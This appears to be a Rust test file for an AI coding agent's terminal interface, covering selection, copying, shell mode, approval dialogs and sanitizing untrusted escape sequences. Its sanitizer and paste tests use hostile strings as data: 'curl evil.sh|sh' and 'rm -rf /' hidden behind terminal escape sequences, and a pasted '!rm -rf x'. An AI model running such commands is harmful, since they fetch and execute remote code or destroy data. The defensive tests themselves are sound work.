            x: to.0 + 1,
            y: to.1 + 1,
            button: 0,
            mods: Mods::default(),
        },
        T0,
    );
    click(a, to.0, to.1, MouseAction::Up, T0)
}

fn copied(cmds: &[Cmd]) -> Option<&str> {
    match cmds {
        [Cmd::Copy(t)] => Some(t),
        _ => None,
    }
}

fn say(a: &mut App, kind: &str, text: &str, seq: u64) {
    a.on_event(
        &env(
            seq,
            Ev::ModelDelta {
                block_index: seq as i64,
                kind: kind.into(),
                text: text.into(),
            },
        ),
        T0,
    );
}

#[test]
fn drag_may_start_on_a_blank_cell_and_run_backwards() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    let cmds = drag(&mut a, (x + 30, y), (x, y));
    assert_eq!(copied(&cmds), Some("The answer is 42"));
}

#[test]
fn a_plain_click_after_a_selection_starts_over_instead_of_extending_it() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    assert!(copied(&drag(&mut a, (x, y), (x + 5, y))).is_some());
    let (hx, hy) = find_cell(&mut a, "> hi", 2);
    click(&mut a, hx, hy, MouseAction::Down, T0 + 5000);
    assert!(click(&mut a, hx, hy, MouseAction::Up, T0 + 5000).is_empty());
    assert!(a.sel.selection.is_none());
}

#[test]
fn double_click_selects_a_word_and_triple_click_the_line() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 5);
    let t = std::cell::Cell::new(T0);
    let press = |a: &mut App| {
        t.set(t.get() + 100);
        let c = click(a, x, y, MouseAction::Down, t.get());
        click(a, x, y, MouseAction::Up, t.get());
        c
    };
    assert!(press(&mut a).is_empty());
    assert_eq!(copied(&press(&mut a)), Some("answer"));
    assert!(a.sel.selection.is_some(), "the word stays highlighted");
    assert_eq!(copied(&press(&mut a)), Some("The answer is 42"));
    // too slow is a new first click
    t.set(t.get() + 2000);
    assert!(press(&mut a).is_empty());
}

#[test]
fn ctrl_c_copies_a_selection_and_otherwise_interrupts() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    drag(&mut a, (x, y), (x + 5, y));
    let cmds = keys(&mut a, "\x03");
    assert_eq!(copied(&cmds), Some("The an"));
    assert!(a.sel.selection.is_none());
    // nothing selected any more: ctrl+c has its old meaning (arm quit)
    assert!(keys(&mut a, "\x03").is_empty());
    assert!(screen(&mut a).contains("press ctrl+c again to quit"));
}

#[test]
fn copied_text_leaves_out_gutters_and_joins_wide_and_wrapped_rows() {
    let mut a = app();
    streamed(&mut a);
    say(&mut a, "thinking", "pondering the weather today", 30);
    say(
        &mut a,
        "text",
        &format!(
            "\n\n{} {}",
            "日本語のテキスト".repeat(12),
            "tail".repeat(40)
        ),
        31,
    );
    let (x, y) = find_cell(&mut a, "pondering", 0);
    let cmds = drag(&mut a, (x, y), (x + 8, y));
    assert_eq!(copied(&cmds), Some("pondering"));
    // from the gutter's own column too: the bar is not text
    let cmds = drag(&mut a, (x - 2, y), (x + 8, y));
    let t = copied(&cmds).expect("copied");
    assert!(!t.contains('│'), "{t:?}");
    // a selection across the wrapped wide-char paragraph keeps every glyph exactly once
    let para = "日本語のテキスト".repeat(12);
    let (wx, wy) = find_cell(&mut a, "日本語", 0);
    let cmds = drag(&mut a, (wx, wy), (COLS - 1, wy + 3));
    let t = copied(&cmds).expect("copied").to_string();
    // wrapped over four screen rows, copied as the one line it is (no indent, no breaks)
    assert!(t.starts_with(&format!("{para} tail")), "{t:?}");
    assert!(!t.contains('\n') && !t.starts_with(' '), "{t:?}");
}

#[test]
fn ctrl_click_opens_urls_and_existing_paths_only() {
    let d = tempfile::tempdir().unwrap();
    let root = synthesis_core::canonicalize(d.path()).unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    streamed(&mut a);
    a.on_event(
        &env(
            30,
            Ev::Notice {
                level: "info".into(),
                text: format!("docs https://example.com/x and {}", root.display()),
            },
        ),
        T0,
    );
    let lines = a.render(COLS, ROWS, T0);
    let find = |needle: &str| {
        let row = lines
            .iter()
            .position(|l| strip_ansi(l).contains(needle))
            .unwrap();
        let plain = strip_ansi(&lines[row]);
        (
            plain[..plain.find(needle).unwrap()].chars().count() as u32 + 3,
            row as u32 + 1,
        )
    };
    let ctrl = Mods {
        ctrl: true,
        ..Mods::default()
    };
    let (x, y) = find("https://example.com/x");
    let cmds = a.on_key(
        Key::Mouse {
            x,
            y,
            button: 0,
            action: MouseAction::Down,
            mods: ctrl,
        },
        T0,
    );
    assert!(
        matches!(&cmds[..], [Cmd::Open(OpenTarget::Url(u))] if u == "https://example.com/x"),
        "{cmds:?}"
    );
    let (x, y) = find(&root.display().to_string());
    let cmds = a.on_key(
        Key::Mouse {
            x,
            y,
            button: 0,
            action: MouseAction::Down,
            mods: ctrl,
        },
        T0,
    );
    assert!(
        matches!(&cmds[..], [Cmd::Open(OpenTarget::Folder(p))] if *p == root),
        "{cmds:?}"
    );
    // without ctrl nothing opens
    let (x, y) = find("https://example.com/x");
    assert!(
        a.on_key(
            Key::Mouse {
                x,
                y,
                button: 0,
                action: MouseAction::Down,
                mods: Mods::default()
            },
            T0
        )
        .is_empty()
    );
}

#[test]
fn startup_notice_is_shown_once_and_only_for_the_same_severity() {
    let mut a = app();
    a.startup_notes(&["dupnote".to_string()]);
    let count = |a: &mut App| screen(a).matches("dupnote").count();
    let notice = |a: &mut App, seq: u64, level: &str| {
        a.on_event(
            &env(
                seq,
                Ev::Notice {
                    level: level.into(),
                    text: "dupnote".into(),
                },
            ),
            T0,
        )
    };
    assert_eq!(count(&mut a), 1, "the startup note itself");
    notice(&mut a, 1, "error"); // same text, other severity: a distinct event, shown
    assert_eq!(count(&mut a), 2);
    notice(&mut a, 2, "warning"); // the event the startup note stands for: not shown again
    assert_eq!(count(&mut a), 2);
    notice(&mut a, 3, "warning"); // a real later one is shown
    assert_eq!(count(&mut a), 3);
}

#[test]
fn wheel_scrolls_the_chat_only_inside_it() {
    let mut a = app();
    for i in 0..60 {
        a.on_event(
            &env(
                i + 1,
                Ev::Notice {
                    level: "info".into(),
                    text: format!("note number {i}"),
                },
            ),
            T0,
        );
    }
    a.render(COLS, ROWS, T0);
    let rect = a.frame.as_ref().unwrap().rects.chat_rect.unwrap();
    let wheel = |x: i64, y: i64| Key::Wheel {
        dir: WheelDir::Up,
        x: x as u32 + 1,
        y: y as u32 + 1,
        mods: Mods::default(),
    };
    a.on_key(wheel(rect.x + 5, rect.y + 5), T0);
    assert_eq!(a.scroll, WHEEL_LINES);
    a.on_key(wheel(0, 0), T0); // the sidebar / header
    assert_eq!(a.scroll, WHEEL_LINES);
    keys(&mut a, "\x1b[6~"); // pagedown
    assert_eq!(a.scroll, 0);
}

#[test]
fn ctrl_l_asks_for_a_screen_reset() {
    let mut a = app();
    assert!(matches!(&keys(&mut a, "\x0c")[..], [Cmd::ResetScreen]));
}

#[test]
fn replayed_session_shows_its_history_and_is_idle() {
    let evs = [
        env(
            1,
            Ev::UserMessage {
                text: "old question".into(),
                display_text: None,
                images: vec![],
            },
        ),
        env(
            2,
            Ev::TaskStarted {
                request: "old question".into(),
                acceptance_criteria: vec![],
                budget: Budget::default(),
            },
        ),
    ];
    let mut a = App::new(cfg("/tmp/proj"), &evs, T0);
    let s = screen(&mut a);
    assert!(s.contains("old question"), "{s}");
    assert!(!a.running() && a.chat.agent.status == "idle");
}

#[test]
fn replayed_unfinished_tool_rows_end_as_interrupted() {
    let evs = [
        env(
            0,
            Ev::UserMessage {
                text: "go".into(),
                display_text: None,
                images: vec![],
            },
        ),
        env(
            1,
            Ev::TaskStarted {
                request: "go".into(),
                acceptance_criteria: vec![],
                budget: Budget::default(),
            },
        ),
        env(
            2,
            Ev::ToolRequested {
                tool_call_id: "c1".into(),
                name: "Bash".into(),
                input: json!({"command": "sleep 60"}),
                input_truncated: false,
                origin: None,
            },
        ),
    ];
    let mut a = App::new(cfg("/tmp/proj"), &evs, T0);
    let s = screen(&mut a);
    assert!(s.contains("previous run was interrupted"), "{s}");
    assert!(
        s.contains("⎿  interrupted") && !s.contains("running…"),
        "{s}"
    );
    assert!(a.chat.agent.items.iter().all(|i| i.status != "running"));
    assert!(!a.animating(), "nothing left to animate");
}

#[test]
fn animation_is_a_function_of_the_explicit_clock_and_startup_is_not_busy() {
    let mut a = app();
    // the harness emits created -> preparing at startup: that is not a running task
    a.on_event(
        &env(
            1,
            Ev::SessionStatusChanged {
                from: "created".into(),
                to: "preparing".into(),
                reason: None,
            },
        ),
        T0,
    );
    assert!(!a.animating(), "an idle app has nothing to animate");
    keys(&mut a, "go");
    keys(&mut a, "\r");
    assert!(a.animating());
    let at = |a: &mut App, now: i64| a.render(COLS, ROWS, now).join("\n");
    assert_eq!(
        at(&mut a, T0),
        at(&mut a, T0 + 40),
        "same 80 ms frame, same bytes"
    );
    assert_ne!(at(&mut a, T0), at(&mut a, T0 + 80 * 3), "the spinner moved");
}

#[test]
fn clean_text_shows_escape_sequences_but_keeps_lines() {
    assert_eq!(crate::sanitize::clean_text("a\nb"), "a\nb");
    let t = crate::sanitize::clean_text("x\x1b[31mred\x1b]0;t\x07\nsecond\u{202e}");
    assert!(
        !t.contains('\x1b') && !t.contains('\u{202e}') && t.contains("\\u{1b}]0;t\\u{7}\nsecond"),
        "{t:?}"
    );
    // nothing after an unterminated sequence is swallowed; tag characters are visible
    let u = crate::sanitize::clean_line("git status\x1b]0;x; curl evil.sh|sh\u{e0041}");
    assert_eq!(u, "git status\\u{1b}]0;x; curl evil.sh|sh\\u{e0041}");
    for opener in ["P", "_", "["] {
        let v = crate::sanitize::clean_text(&format!("a\x1b{opener}b; rm -rf /\nc"));
        assert!(v.contains("b; rm -rf /\nc") && !v.contains('\x1b'), "{v:?}");
    }
    let long = format!("{};x", "a".repeat(100_000));
    assert!(crate::sanitize::clean_line(&long).ends_with(";x"));
}

#[test]
fn untrusted_labels_are_sanitized_at_ingest() {
    let mut a = App::new(cfg("/tmp/pr\x1b]0;x\x07oj"), &[], T0);
    a.toast("saved\x1b[2J\u{e0041}", T0, false);
    a.model_switched("m\x1b]52;c;x\x07");
    let toast = a.toast.as_ref().unwrap().text.clone();
    assert!(
        !toast.contains('\x1b') && toast.contains("\\u{e0041}"),
        "{toast:?}"
    );
    for t in [
        &a.chat.agent.cwd,
        &a.chat.agent.model,
        &a.activity.model,
        &a.activity.project,
    ] {
        assert!(!t.contains('\x1b') && !t.contains('\x07'), "{t:?}");
    }
    for l in a.render(COLS, ROWS, T0) {
        assert!(!l.contains("\x1b]") && !l.contains("\x1b[2J"), "{l:?}");
    }
}

#[test]
fn alt_backspace_alt_d_and_ctrl_w_edit_the_prompt_without_touching_the_task() {
    let mut a = app();
    keys(&mut a, "git commit-msg --amend");
    keys(&mut a, "\x1b\x7f"); // option+backspace (ESC DEL)
    assert_eq!(a.editor.text(), "git commit-msg --");
    keys(&mut a, "\x1b[127;3u"); // kitty CSI-u
    assert_eq!(a.editor.text(), "git commit-msg ");
    keys(&mut a, "\x17"); // ctrl+w: whitespace-delimited
    assert_eq!(a.editor.text(), "git ");
    a.editor.cur = 0;
    keys(&mut a, "\x1bd"); // alt+d
    assert_eq!(a.editor.text(), " ");
    keys(&mut a, "x y");
    a.editor.cur = 1;
    keys(&mut a, "\x1b[3;3~"); // alt+delete: forward, skips the space, takes "y"
    assert_eq!(a.editor.text(), "x ");
    // while a task runs the same keys must not be read as Esc (which would cancel it)
    keys(&mut a, "\r");
    assert!(a.running());
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "more words");
    keys(&mut a, "\x1b\x7f\x1bd");
    assert!(!token.is_cancelled());
    assert!(!a.chat.agent.interrupting);
}

#[test]
fn ctrl_o_toggles_expanded_even_while_running_or_in_a_dialog_and_the_hint_follows() {
    let mut a = app();
    assert!(screen(&mut a).contains("ctrl+o: expand"));
    keys(&mut a, "\x0f");
    assert!(a.expanded);
    assert!(screen(&mut a).contains("ctrl+o: collapse"));
    keys(&mut a, "go\r"); // a running task
    keys(&mut a, "\x0f");
    assert!(!a.expanded);
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    keys(&mut a, "\x0f"); // over a dialog: toggles, answers nothing
    assert!(a.expanded);
    assert!(rx.try_recv().is_err());
    assert_eq!(a.dialogs.len(), 1);
}

/// 1-based terminal cell of `needle` on the last rendered screen.
fn cell(a: &mut App, needle: &str) -> (u32, u32) {
    for (y, l) in a.render(COLS, ROWS, T0).iter().enumerate() {
        let l = strip_ansi(l);
        if let Some(i) = l.find(needle) {
            return (l[..i].chars().count() as u32 + 1, y as u32 + 1);
        }
    }
    panic!("{needle:?} not on screen");
}

fn right_click(a: &mut App, x: u32, y: u32) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x,
            y,
            button: 2,
            action: MouseAction::Down,
            mods: Mods::default(),
        },
        T0,
    )
}

#[test]
fn right_click_in_the_prompt_asks_for_a_paste_and_pasting_never_submits() {
    let mut a = app();
    let (x, y) = cell(&mut a, "Enter send");
    assert!(matches!(
        &right_click(&mut a, x, y)[..],
        [Cmd::PasteClipboard]
    ));
    // the host answers with the clipboard text: multi-line, inserted at the cursor, no submit
    keys(&mut a, "ab");
    a.editor.left();
    a.paste_clipboard("one\r\ntwo\x1b[31m\u{202e}\nthree", T0 + 1);
    assert_eq!(a.editor.text(), "aone\ntwo[31m\nthreeb");
    assert!(!a.running(), "pasted newlines must not submit");
    assert!(a.editor.multiline());
    // the paste-activity signal fired: a dialog opening now stays unarmed for a moment
    assert!(a.paste_quiet_until > T0);
    a.paste_clipboard("", T0 + 2);
    assert!(screen_at(&mut a, T0 + 2).contains("clipboard is empty"));
    // 5 MiB of clipboard: capped by the prompt limit, nothing inserted, prompt intact
    let before = a.editor.text();
    a.paste_clipboard(&"x".repeat(5 << 20), T0 + 3);
    assert_eq!(a.editor.text(), before);
    assert!(screen_at(&mut a, T0 + 3).contains("paste is too large"));
}

#[test]
fn right_click_outside_the_prompt_or_over_a_dialog_or_picker_does_nothing() {
    let mut a = app();
    let (px, py) = cell(&mut a, "Enter send");
    let rect = a.frame.as_ref().unwrap().rects.chat_rect.unwrap();
    assert!(right_click(&mut a, 1, 1).is_empty(), "header");
    assert!(
        right_click(&mut a, rect.x as u32 + 3, rect.y as u32 + 1).is_empty(),
        "message area"
    );
    keys(&mut a, "\x10"); // ctrl+p: command picker owns the keyboard
    assert!(right_click(&mut a, px, py).is_empty());
    keys(&mut a, "\x1b");

    let mut a = app();
    let (px, py) = cell(&mut a, "Enter send");
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS); // armed
    a.render(COLS, ROWS, T0);
    for (x, y) in [(px, py), (px, py + 3), (5, ROWS - 3)] {
        assert!(right_click(&mut a, x, y).is_empty());
    }
    assert!(rx.try_recv().is_err(), "a right click answers nothing");
    assert_eq!(a.dialogs.len(), 1);
    // even a clipboard answer that arrives late is not typed into the dialog's prompt
    assert_eq!(a.editor.text(), "");
}

#[test]
fn compact_command_asks_the_host_and_blocks_new_tasks_while_it_runs() {
    let mut a = app();
    assert!(matches!(
        &keys(&mut a, "/compact\r")[..],
        [Cmd::Compact { instructions: None }]
    ));
    let cmds = keys(&mut a, "/compact keep the API notes\r");
    assert!(
        matches!(&cmds[..], [Cmd::Compact { instructions: Some(i) }] if i == "keep the API notes")
    );
    a.compact_started(T0);
    assert!(keys(&mut a, "hello\r").is_empty());
    assert!(screen(&mut a).contains("compacting the conversation"));
    a.compact_done();
    assert!(matches!(&keys(&mut a, "\r")[..], [Cmd::StartTask { .. }]));
}

#[test]
fn context_events_drive_the_status_line() {
    let mut a = app();
    let status = |a: &mut App| screen(a).lines().last().unwrap_or_default().to_string();
    assert!(!status(&mut a).contains("ctx "));
    a.on_event(
        &env(
            1,
            Ev::ContextUsage {
                used_tokens: 124_000,
                window_tokens: 200_000,
                percent: 62.0,
                source: "provider".into(),
                stale: false,
            },
        ),
        T0,
    );
    assert!(
        status(&mut a).contains("ctx 62% 124k/200k"),
        "{}",
        status(&mut a)
    );
    a.on_event(
        &env(
            2,
            Ev::ContextCompacting {
                reason: "auto".into(),
                used_tokens: 168_000,
                window_tokens: 200_000,
            },
        ),
        T0,
    );
    assert!(status(&mut a).contains("⟳ compacting…"));
    a.on_event(
        &env(
            3,
            Ev::ContextUsage {
                used_tokens: 41_000,
                window_tokens: 200_000,
                percent: 20.5,
                source: "estimate".into(),
                stale: false,
            },
        ),
        T0,
    );
    assert!(status(&mut a).contains("ctx 21% 41k/200k"));
}

// ---- `!` shell prompt -------------------------------------------------------------------

#[test]
fn typed_bang_enters_the_shell_prompt_and_enter_runs_the_command() {
    let mut a = app();
    keys(&mut a, "!");
    assert!(a.bash());
    assert!(screen(&mut a).contains("! bash mode"));
    // `?` is a character here, not /help; suggestions stay off
    keys(&mut a, "echo hi?");
    assert_eq!(a.editor.text(), "!echo hi?");
    assert!(!screen(&mut a).contains("commands and keys"));
    keys(&mut a, "\x7f"); // drop the `?`
    let cmds = keys(&mut a, "\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: false, .. }] if command == "echo hi"),
        "{cmds:?}"
    );
    assert!(a.task_running(), "Esc and ctrl+c cancel it like a task");
    assert_eq!(
        a.editor.history.last().map(String::as_str),
        Some("!echo hi")
    );
    // busy: a second one is queued, not run
    keys(&mut a, "!");
    assert!(keys(&mut a, "ls\r").is_empty());
    assert_eq!(a.queue, ["!ls"]);
}

#[test]
fn double_bang_only_records() {
    let mut a = app();
    keys(&mut a, "!");
    let cmds = keys(&mut a, "!echo hi\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: true, .. }] if command == "echo hi"),
        "{cmds:?}"
    );
}

#[test]
fn only_a_typed_bang_makes_a_shell_command() {
    let mut a = app();
    // a paste, or a burst of characters, that starts with `!` is plain text
    keys(&mut a, "\x1b[200~!rm -rf x\x1b[201~");
    assert!(!a.bash(), "{:?}", a.editor.text());
    assert!(screen(&mut a).contains("typed ! to run a shell command"));
    // the model gets the text without the marker space
    assert!(
        matches!(&keys(&mut a, "\r")[..], [Cmd::StartTask { text, .. }] if text == "!rm -rf x")
    );
    let mut a = app();
    a.on_key(Key::Text("!ls".into()), T0);
    assert!(!a.bash());
    // `!` in the middle of text is just a character
    let mut a = app();
    keys(&mut a, "hello!");
    assert!(!a.bash());
}

#[test]
fn escape_and_backspace_leave_the_shell_prompt_and_esc_cancels_a_running_command() {
    let mut a = app();
    keys(&mut a, "!");
    keys(&mut a, "ls");
    keys(&mut a, "\x1b");
    assert!(!a.bash() && a.editor.text().is_empty());
    keys(&mut a, "!");
    keys(&mut a, "\x7f");
    assert!(!a.bash());
    // a running command: Esc cancels it first and the prompt keeps its text
    keys(&mut a, "!");
    keys(&mut a, "sleep 9\r");
    keys(&mut a, "!");
    assert!(a.bash());
    keys(&mut a, "\x1b");
    assert!(
        a.task.as_ref().unwrap().cancelling,
        "esc cancelled the command"
    );
    assert!(a.bash(), "the draft stays");
    a.command_done(None);
    assert!(!a.task_running());
}

#[test]
fn slash_in_the_shell_prompt_is_a_path_not_a_command() {
    let mut a = app();
    keys(&mut a, "!");
    let cmds = keys(&mut a, "/bin/echo x\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, .. }] if command == "/bin/echo x"),
        "{cmds:?}"
    );
}

#[test]
fn ctrl_u_after_a_paste_clears_the_prompt() {
    let mut a = app();
    keys(&mut a, "\x1b[200~!echo pasted\x1b[201~");
    keys(&mut a, "\x15");
    assert_eq!(a.editor.text(), "", "cursor {}", a.editor.cur);
}

#[test]
fn shift_tab_visits_every_mode_once_per_press_including_past_the_bypass_dialog() {
    let mut a = app();
    let mut seen = vec![];
    for _ in 0..10 {
        keys(&mut a, "\x1b[Z");
        seen.push(if a.picker.is_some() {
            "bypass?"
        } else {
            mode_str(a.mode)
        });
    }
    assert_eq!(
        seen,
        [
            "acceptEdits",
            "plan",
            "auto",
            "bypass?",
            "default",
            "acceptEdits",
            "plan",
            "auto",
            "bypass?",
            "default"
        ]
    );
}

#[test]
fn edit_approval_shows_a_numbered_hunk_not_an_escaped_one_liner() {
    let d = tempfile::tempdir().unwrap();
    let cwd = d.path().canonicalize().unwrap();
    std::fs::write(cwd.join("f.txt"), "a\nb\nc\nd\n").unwrap();
    let mut a = App::new(cfg(cwd.to_str().unwrap()), &[], T0);
    let (ask, _rx) = ask(
        "Edit",
        json!({"file_path": "f.txt", "old_string": "b\nc", "new_string": "B\nc"}),
        vec![],
    );
    a.on_approval(ask, T0);
    let s = screen_at(&mut a, T0 + 1000);
    assert!(!s.contains("\\n"), "no escaped newlines:\n{s}");
    assert!(s.contains("+1 −1") || s.contains("+1 -1"), "{s}");
    assert!(
        s.contains("2") && s.contains("− b") && s.contains("+ B"),
        "{s}"
    );
}

#[test]
fn clicking_an_option_in_an_approval_dialog_answers_it_once_armed() {
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    let _ = a.render(COLS, ROWS, T0);
    let (x, y) = find_cell(&mut a, "2. No", 0);
    click(&mut a, x, y, MouseAction::Down, T0 + 10);
    assert!(
        rx.try_recv().is_err(),
        "ignored while the dialog is still arming"
    );
    let _ = a.render(COLS, ROWS, T0 + 1000);
    click(&mut a, x, y, MouseAction::Down, T0 + 1000);
    let ans = rx.try_recv().expect("the click answered");
    assert_eq!(ans.decision, ApprovalDecision::Deny);
    assert!(a.dialogs.is_empty());
}

#[test]
fn compacting_shows_a_working_line_and_errors_are_sentences_not_debug() {
    let mut a = app();
    a.compact_started(T0);
    let s = screen_at(&mut a, T0 + 3000);
    assert!(s.contains("Compacting") && s.contains("3s"), "{s}");
    assert!(
        !s.contains("esc to interrupt"),
        "compaction cannot be interrupted: {s}"
    );
    a.compact_done();
    assert!(!screen_at(&mut a, T0 + 3000).contains("Compacting"));
    for e in ["NoProgress { before: 3, after: 11 }", "Nothing"] {
        let (t, tone) = crate::chat::friendly_compact_error(e);
        assert!(t.starts_with("nothing to compact") && tone == "warn", "{t}");
    }
    let (t, _) = crate::chat::friendly_compact_error("Summarizer(Provider(\"boom\"))");
    assert!(!t.contains("Summarizer("), "{t}");
}

#[test]
fn header_status_panel_and_footer_share_one_context_meter_and_clear_resets_it() {
    let mut a = app();
    a.on_event(
        &env(
            1,
            Ev::ContextUsage {
                used_tokens: 100_000,
                window_tokens: 200_000,
                percent: 50.0,
                source: "provider".into(),
                stale: false,
            },
        ),
        T0,
    );
    let s = screen(&mut a);
    let head = s.lines().next().unwrap();
    assert!(head.contains("ctx") && head.contains("50%"), "{head}");
    assert!(
        s.contains("100.0k/200.0k") || s.contains("100k/200k"),
        "{s}"
    );
    assert!(s.lines().last().unwrap().contains("ctx 50% 100k/200k"));
    keys(&mut a, "/clear\r");
    let s = screen(&mut a);
    assert!(s.lines().next().unwrap().contains("0%"), "{s}");
    assert!(!s.lines().last().unwrap().contains("ctx 50%"), "{s}");
}

#[test]
fn welcome_box_shows_the_folder() {
    let mut a = app();
    let s = screen(&mut a);
    assert!(s.contains("cwd: /tmp/proj"), "{s}");
    let long = format!("/tmp/{}/repo", "d".repeat(150));
    let mut b = App::new(cfg(&long), &[], T0);
    let s = screen(&mut b);
    assert!(
        s.contains("cwd: …") && s.contains("/repo"),
        "long paths keep their end: {s}"
    );
}

#[test]
fn new_slash_commands_ask_the_host_and_status_has_no_debug_output() {
    let mut a = app();
    assert!(matches!(
        &keys(&mut a, "/mcp\r")[..],
        [Cmd::Info(Info::Mcp)]
    ));
    assert!(matches!(
        &keys(&mut a, "/agents\r")[..],
        [Cmd::Info(Info::Agents { all: false })]
    ));
    assert!(matches!(
        &keys(&mut a, "/agents --all\r")[..],
        [Cmd::Info(Info::Agents { all: true })]
    ));
    assert!(matches!(
        &keys(&mut a, "/peers\r")[..],
        [Cmd::Info(Info::Peers)]
    ));
    assert!(matches!(&keys(&mut a, "/name beta\r")[..], [Cmd::Info(Info::Name(n))] if n == "beta"));
    assert!(matches!(
        &keys(&mut a, "/permissions\r")[..],
        [Cmd::Info(Info::Permissions(PermAction::List))]
    ));
    let c = keys(&mut a, "/permissions allow Bash(git status:*)\r");
    assert!(
        matches!(&c[..], [Cmd::Info(Info::Permissions(PermAction::Allow(r)))] if r == "Bash(git status:*)")
    );
    let c = keys(&mut a, "/permissions remove Bash(git status:*)\r");
    assert!(matches!(
        &c[..],
        [Cmd::Info(Info::Permissions(PermAction::Remove(_)))]
    ));
    assert!(keys(&mut a, "/permissions allow\r").is_empty());
    assert!(screen(&mut a).contains("usage: /permissions"));
    keys(&mut a, "/status\r");
    let s = screen(&mut a);
    assert!(s.contains("mode") && s.contains("manual"), "{s}");
    assert!(!s.contains("SandboxStatus") && !s.contains("{ mode"), "{s}");
}

#[test]
fn resume_picker_lists_this_folder_first_with_the_prompt_and_age() {
    let mut c = cfg("/tmp/proj");
    let mk = |id: &str, cwd: &str, title: &str, mtime: i64| SavedSession {
        id: id.into(),
        cwd: cwd.into(),
        title: title.into(),
        updated_at: "2026-01-01T00:00:00Z".into(),
        mtime,
    };
    c.saved = vec![
        mk(
            "aaaaaaaa1",
            "/tmp/proj",
            "fix the parser",
            T0 - 3 * 3_600_000,
        ),
        mk("bbbbbbbb2", "/elsewhere", "other folder work", T0 - 60_000),
    ];
    let mut a = App::new(c, &[], T0);
    keys(&mut a, "/resume\r");
    let s = screen(&mut a);
    assert!(s.contains("fix the parser") && s.contains("3h ago"), "{s}");
    assert!(!s.contains("other folder work"), "{s}");
    assert!(s.contains("show sessions from all folders"), "{s}");
    keys(&mut a, "\x1b[B");
    keys(&mut a, "\r");
    let s = screen(&mut a);
    assert!(
        s.contains("other folder work") && s.contains("/elsewhere"),
        "{s}"
    );
}

#[test]
fn a_big_paste_is_a_chip_that_expands_when_sent() {
    let mut a = app();
    let big = (1..=300)
        .map(|i| format!("line {i}"))
        .collect::<Vec<_>>()
        .join("\n");
    a.on_key(Key::Paste(big.clone()), T0);
    assert_eq!(a.editor.text(), "[Pasted text #1 +300 lines]");
    keys(&mut a, "see ");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if *text == format!("{big}see ")));
}

#[test]
fn modify_other_keys_shift_enter_makes_a_newline() {
    let mut a = app();
    keys(&mut a, "a");
    keys(&mut a, "\x1b[27;2;13~");
    keys(&mut a, "b");
    assert_eq!(a.editor.text(), "a\nb");
}

#[test]
fn bypass_confirmation_has_no_filter_line() {
    let mut a = app();
    for _ in 0..4 {
        keys(&mut a, "\x1b[Z");
    }
    let s = screen(&mut a);
    assert!(
        s.contains("Bypass permissions?") && !s.contains("filter:"),
        "{s}"
    );
}

#[test]
fn effort_cycles_with_alt_t_and_shows_in_the_footer() {
    let mut a = app();
    assert!(screen(&mut a).contains("effort: auto"));
    for want in ["low", "medium", "high"] {
        let cmds = keys(&mut a, "\x1bt");
        assert!(
            matches!(&cmds[..], [Cmd::SetEffort(Some(e))] if e == want),
            "{cmds:?}"
        );
        assert!(screen(&mut a).contains(&format!("effort: {want}")));
    }
    let cmds = keys(&mut a, "\x1bt");
    assert!(matches!(&cmds[..], [Cmd::SetEffort(None)]), "{cmds:?}");
    let cmds = keys(&mut a, "/effort high\r");
    assert!(matches!(&cmds[..], [Cmd::SetEffort(Some(e))] if e == "high"));
    assert_eq!(a.chat.agent.effort, "high", "the header and status read it");
    let cmds = keys(&mut a, "/effort bogus\r");
    assert!(cmds.is_empty() && screen(&mut a).contains("usage: /effort"));
}

#[test]
fn browser_lists_the_browser_and_web_calls() {
    let mut a = app();
    assert!(screen_after(&mut a, "/browser\r").contains("no browser and web calls"));
    for (i, (name, input)) in [
        ("browser_navigate", json!({"url": "https://example.com/a"})),
        ("WebFetch", json!({"url": "https://example.com/b"})),
        ("Bash", json!({"command": "zzmarker"})),
    ]
    .into_iter()
    .enumerate()
    {
        a.on_event(
            &env(
                i as u64 + 1,
                Ev::ToolRequested {
                    tool_call_id: format!("c{i}"),
                    name: name.into(),
                    input,
                    input_truncated: false,
                    origin: None,
                },
            ),
            T0,
        );
    }
    let s = screen_after(&mut a, "/browser\r");
    assert!(s.contains("2 browser and web calls"), "{s}");
}

fn screen_after(a: &mut App, k: &str) -> String {
    keys(a, k);
    screen(a)
}

#[test]
fn a_saved_effort_is_restored_only_when_the_model_declares_it() {
    let mut a = app();
    assert_eq!(
        a.restore_effort(Some("high".into())).as_deref(),
        Some("high")
    );
    assert_eq!(a.chat.agent.effort, "high");
    assert_eq!(a.restore_effort(Some("max".into())), None);
    assert_eq!(a.chat.agent.effort, "");
    assert!(screen(&mut a).contains("effort max is not declared by this model"));
}

#[test]
fn switching_model_in_process_resets_the_effort_to_auto_with_a_notice() {
    let mut a = app();
    keys(&mut a, "/effort high\r");
    assert_eq!(a.effort().as_deref(), Some("high"));
    a.model_switched("fake/b");
    assert_eq!(a.effort(), None);
    assert_eq!(a.chat.agent.effort, "");
    assert!(screen(&mut a).contains("effort reset to auto"));
}

#[test]
fn hardware_caret_follows_the_prompt_caret() {
    let mut a = app();
    keys(&mut a, "abc");
    a.render(COLS, ROWS, T0);
    let (x0, y0) = a.caret().expect("prompt shown");
    keys(&mut a, "d");
    a.render(COLS, ROWS, T0);
    assert_eq!(a.caret(), Some((x0 + 1, y0)));
    // the cell left of the caret holds the last typed char
    let lines = a.render(COLS, ROWS, T0);
    let row: Vec<char> = strip_ansi(&lines[y0 as usize]).chars().collect();
    let x = (x0 + 1) as usize;
    assert_eq!(row[x - 2..x], ['c', 'd'], "{row:?}");
}

